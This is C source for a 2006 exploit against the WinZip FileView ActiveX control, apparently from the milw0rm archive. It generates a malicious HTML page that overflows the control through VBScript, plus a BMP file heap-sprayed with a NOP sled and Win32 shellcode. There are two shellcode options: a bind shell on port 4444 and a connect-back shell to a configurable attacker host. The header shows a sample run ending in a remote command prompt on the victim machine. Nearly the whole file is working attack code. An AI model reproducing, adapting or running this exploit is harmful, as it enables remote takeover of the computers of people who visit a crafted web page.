/* WinZip <= 10.0.7245 FileView ActiveX buffer overflow exploit
 * ============================================================
 * A vulnerability has been identified within Winzip that allows remote
 * attackers to execute arbitrary code. User interaction is required to 
 * exploit this vulnerability in that the target must visit a malicious 
 * web page. The flaw exists within "FileView" ActiveX control which 
 * contains stack based overflow conditions. This exploit generates a 
 * malicious html page and contains shellcode embedded within an image
 * file. Due to the random nature of the heap, this exploit uses hard
 * coded location of the image bytes within the heap and as such is
 * unreliable in exploitation of this bug, but has approximately 1 in
 * 6 hit ratio within the tested environment. 
 *
 * Example.
 * $ ./prdelka-vs-MS-winzip -f index.html -i foo.bmp -s 0 -t 0
 * [ WinZip <= 10.0.7245 FileView ActiveX overflow exploit
 * [ Using shellcode 'Win32 x86 bind() shellcode (4444/tcp default)' (400 bytes)
 * [ Using target 'WinXP SP2(en) WinZIP 10.0.6667'
 * [ Creating image containing shellcode 'foo.bmp'
 * [ Creating html exploit page 'index.html'
 * $
 * ... clicky clicky MSIE ...
 * $ telnet 192.168.1.223 4444
 * Connected to 192.168.1.223.
 * Escape character is '^]'.
 * 
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 * 
 * C:\Documents and Settings\User\Desktop>
 *
 * - prdelka
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <getopt.h>

#define NOPSIZE 999999

struct target {
        char* name;
        int retaddr;
};

struct shellcode {
        char* name;
        short port;
        int host;
        char* shellcode;
};

int targetno = 1;

struct target targets[] = {
        {"WinXP SP2(en) WinZIP 10.0.6667",0x02DA3269}
	/* IE 6.0.2900.2180.xp_sp2_gdr.050301-1519 WZ 10.0(6667)" */
};

int shellno = 2;

struct shellcode shellcodes[] = {
        {"Win32 x86 bind() shellcode (4444/tcp default)",162,-1,
        "\x48\x40\xf5\x49\xd6\x4a\xf9\x91\x47\x96\x2f\xf8\x9b\x37\x41\xf5"
        "\x99\x47\xf9\xf9\xfc\xf9\x48\x4e\x4b\x9b\x90\x9b\xf5\x97\x40\xf9"
        "\xd6\x41\xf9\x48\x9b\x92\xfd\x9b\x49\x42\x4f\x9f\x90\xd6\x27\x9b"
        "\x93\x46\x2f\x90\xfd\x4a\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b"
        "\x81\x73\x13\xbc\xe8\x2b\x27\x83\xeb\xfc\xe2\xf4\x3d\x2c\x7f\xd5"
        "\x43\x17\xd7\x4d\x57\xa5\xc3\xde\x43\x17\xd4\x47\x37\x84\x0f\x03"
        "\x37\xad\x17\xac\xc0\xed\x53\x26\x53\x63\x64\x3f\x37\xb7\x0b\x26"
        "\x57\xa1\xa0\x13\x37\xe9\xc5\x16\x7c\x71\x87\xa3\x7c\x9c\x2c\xe6"
        "\x76\xe5\x2a\xe5\x57\x1c\x10\x73\x98\xc0\x5e\xc2\x37\xb7\x0f\x26"
        "\x57\x8e\xa0\x2b\xf7\x63\x74\x3b\xbd\x03\x28\x0b\x37\x61\x47\x03"
        "\xa0\x89\xe8\x16\x67\x8c\xa0\x64\x8c\x63\x6b\x2b\x37\x98\x37\x8a"
        "\x37\xa8\x23\x79\xd4\x66\x65\x29\x50\xb8\xd4\xf1\xda\xbb\x4d\x4f"
        "\x8f\xda\x43\x50\xcf\xda\x74\x73\x43\x38\x43\xec\x51\x14\x10\x77"
        "\x43\x3e\x74\xae\x59\x8e\xaa\xca\xb4\xea\x7e\x4d\xbe\x17\xfb\x4f"
        "\x65\xe1\xde\x8a\xeb\x17\xfd\x74\xef\xbb\x78\x74\xff\xbb\x68\x74"
        "\x43\x38\x4d\x4f\xad\xb4\x4d\x74\x35\x09\xbe\x4f\x18\xf2\x5b\xe0"
        "\xeb\x17\xfd\x4d\xac\xb9\x7e\xd8\x6c\x80\x8f\x8a\x92\x01\x7c\xd8"
        "\x6a\xbb\x7e\xd8\x6c\x80\xce\x6e\x3a\xa1\x7c\xd8\x6a\xb8\x7f\x73"
        "\xe9\x17\xfb\xb4\xd4\x0f\x52\xe1\xc5\xbf\xd4\xf1\xe9\x17\xfb\x41"
        "\xd6\x8c\x4d\x4f\xdf\x85\xa2\xc2\xd6\xb8\x72\x0e\x70\x61\xcc\x4d"
        "\xf8\x61\xc9\x16\x7c\x1b\x81\xd9\xfe\xc5\xd5\x65\x90\x7b\xa6\x5d"
        "\x84\x43\x80\x8c\xd4\x9a\xd5\x94\xaa\x17\x5e\x63\x43\x3e\x70\x70"
        "\xee\xb9\x7a\x76\xd6\xe9\x7a\x76\xe9\xb9\xd4\xf7\xd4\x45\xf2\x22"
        "\x72\xbb\xd4\xf1\xd6\x17\xd4\x10\x43\x38\xa0\x70\x40\x6b\xef\x43"
        "\x43\x3e\x79\xd8\x6c\x80\x55\xff\x5e\x9b\x78\xd8\x6a\x17\xfb\x27"},
        {"Win32 x86 connect() shellcode (4444/tcp default)",167,160,
        "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
        "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
        "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
        "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
        "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
        "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
        "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
        "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
        "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
        "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68"
        "\x01\x02\x03\x04\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9"
        "\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68"
        "\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3"
        "\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab"
        "\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51"
        "\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6"
        "\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6"
        "\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"}
};

char html1[]="<HTML>\r\n<HEAD>\r\n<TITLE></TITLE>\r\n</HEAD>\r\n"
	     "<BODY>\r\n<SCRIPT LANGUAGE=\"VBScript\">\r\nSub WZ"
	     "FILEVIEW_OnAfterItemAdd(Item)\r\nWZFILEVIEW.FilePa"
	     "ttern = \""; /* smash the stack here */ 

char html2[]="\"\r\nend sub\r\n</SCRIPT>\r\n<IMG SRC=\"";

char html3[]="\">\r\n<OBJECT ID=\"WZFILEV"
	     "IEW\" WIDTH=200 HEIGHT=200\r\nCLASSID=\"CLSID:A09A"
	     "E68F-B14D-43ED-B713-BA413F034904\">\r\n</OBJECT>\r"
	     "\n</BODY>\r\n</HTML>\r\n";


char bmphdr[]="\x42\x4d\x3e\xbb\x2d\x00\x00\x00\x00\x00\x36\x00\x00"
	      "\x00\x28\x00\x00\x00\xe7\x03\x00\x00\xe7\x03\x00\x00"
	      "\x01\x00\x18\x00\x00\x00\x00\x00\x08\xbb\x2d\x00\x00"
	      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	      "\x00\x00";
int ret;

void help(char* progname){
	int count;
	printf("[ Usage instructions.\n[\n");
	printf("[ %s <required> (optional)\n[\n[   --filename|-f <file.html>\n",progname);
	printf("[   --imgname|-i <image.bmp>\n[   --shellcode|-s <shell#>\n");
	printf("[   --shellport|-p (port)\n");
	printf("[   --shellhost|-i (ip)\n");
	printf("[   --target|-t <target#/0xretaddr>\n[\n");
	printf("[ Target#'s\n");
	for(count = 0;count <= targetno - 1;count++){
        	printf("[ %d %s 0x%x\n",count,targets[count],targets[count]);
	}
	printf("[\n[ Shellcode#'s\n");
	for(count = 0;count <= shellno - 1;count++){
        	printf("[ %d \"%s\" (length %d bytes)\n",count,shellcodes[count].name,strlen(shellcodes[count].shellcode));
	}
	exit(0);
}

void setret(char* retarg){
	int value = atoi(retarg);
	switch(value){
		case 0:
			printf("[ Using target '%s'\n",targets[ret].name);
			ret = targets[ret].retaddr;
			break;
		default:
			ret = strtoul(retarg,NULL,16);
			printf("[ Using return address '0x%x'\n",ret);
			break;
	}
}

int main(int argc, char* argv[]){
	unsigned long i, fd;
	int c, index, payg, paya, lhost;
	short shellport, shellport2;
	int ishell = 0, itarg = 0;
	char *buffer, *file, *img, *payload;
        static struct option options[] = {
                {"filename", 1, 0, 'f'},
                {"imgname", 1, 0, 'i'},
                {"target", 1, 0, 't'},
                {"shellcode", 1, 0, 's'},
                {"shellport", 1, 0, 'p'},
                {"shellhost", 1, 0, 'd'},
                {"help", 0, 0,'h'}
        };
	printf("[ WinZip <= 10.0.7245 FileView ActiveX overflow exploit\n");
        while(c != -1){
		c = getopt_long(argc,argv,"f:i:t:s:p:d:h",options,&index);
		switch(c){
			case 'f':
				file = optarg;
				break;
			case 'i':
				img = optarg;
				break;
			case 't':
				itarg = 1;
				setret(optarg);
				if(strlen((char*)&ret) < 4){
					fprintf(stderr,"[ Selected target contains a null address!\n");	
					exit(-1);
				}
				break;
			case 's':
                                if(ishell==0){
                                payg = atoi(optarg);
				switch(payg){
                                case 0:
                               		printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
                                        payload = malloc(strlen(shellcodes[payg].shellcode)+1);
                                        memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
                                        memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
                                        shellport2 = 4444;
                                        ishell = 1;
                                        break;
                                case 1:
                                	printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
                                	payload = malloc(strlen(shellcodes[payg].shellcode)+1);
                                	memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
                                	memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
                                	shellport2 = 4444;
                                	ishell = 1;
                                	break;
                                default:
                                        printf("[ Invalid shellcode selection %d\n",payg);
                                        exit(0);
                                        break;
				}
				}
				break;
			case 'p':
                                if(ishell==1){
                                        if(shellcodes[payg].port > -1){
                                                paya = strlen(payload);
                                                shellport = atoi(optarg);
                                                shellport2 = shellport;
                                                shellport =(shellport&0xff)<<8 | shellport>>8;
                                                memcpy((void*)&payload[shellcodes[payg].port],&shellport,sizeof(shellport));
                                                if(paya > strlen(payload)) {
                                                        printf("[ Error shellcode port introduces null bytes\n");
                                                        exit(1);
                                                }
						printf("[ Shellcode port changed to '%u'\n",atoi(optarg));
                                        }
                                        else{
                                                printf("[ (%s) port selection is ignored for current shellcode\n",optarg);
                                        }
                                }
                                else{
                                        printf("[ No shellcode selected yet, ignoring (%s) port selection\n",optarg);
                                }
				break;
			case 'd':
			        if(ishell==1){
                                	if(shellcodes[payg].host > -1){
                              			paya = strlen(payload);
                                		lhost = inet_addr(optarg);
                                		memcpy((void*)&payload[shellcodes[payg].host],&lhost,sizeof(lhost));
                                		if(paya > strlen(payload)){
                                			printf("[ Error shellhost introduces null bytes\n");
                                			exit(1);
                                		}
						printf("[ Shellhost has been changed to '%s'\n",optarg);
                                	}
                                	else{
                                		printf("[ (%s) shellhost selection is ignored for current shellcode\n",optarg);
                                	}
                               	}
                                else {
                                	printf("[ No shellcode selected yet, ignoring (%s) shellhost selection\n",optarg);
                                }
				break;
			case 'h':
				help(argv[0]);
				break;
			default:
				break;
		}
	}
	if(ishell==0||itarg==0||strlen(file)==0||strlen(img)==0){
		printf("[ Error insufficient arguements, try running '%s --help'\n",argv[0]);
		exit(0);
	}

// create image
	printf("[ Creating image containing shellcode '%s'\n",img);
	fd = open(img,O_RDWR|O_CREAT,S_IRWXU);
	if(fd == -1){
		fprintf(stderr,"[ Error creating %s\n",file);
		exit(-1);
	}
	write(fd,bmphdr,sizeof(bmphdr));
	for(i = 0;i < NOPSIZE;i++){
		write(fd,"\x90",1);
	}
	write(fd,payload,strlen(payload));
	close(fd);

// create html
	printf("[ Creating html exploit page '%s'\n",file);
	fd = open(file,O_RDWR|O_CREAT,S_IRWXU);
        if(fd == -1){
		fprintf(stderr,"[ Error creating %s\n",file);
                exit(-1);
        }
	write(fd,html1,strlen(html1));
	for(i = 0;i < 265;i++){
		write(fd,"A",1);
	}
	write(fd,&ret,4);
	for(i = 0;i < 1827;i++){
		write(fd,"A",1);
	}
	write(fd,html2,strlen(html2));
	write(fd,img,strlen(img));
	write(fd,html3,strlen(html3));
        close(fd);
}

// milw0rm.com [2006-11-15]
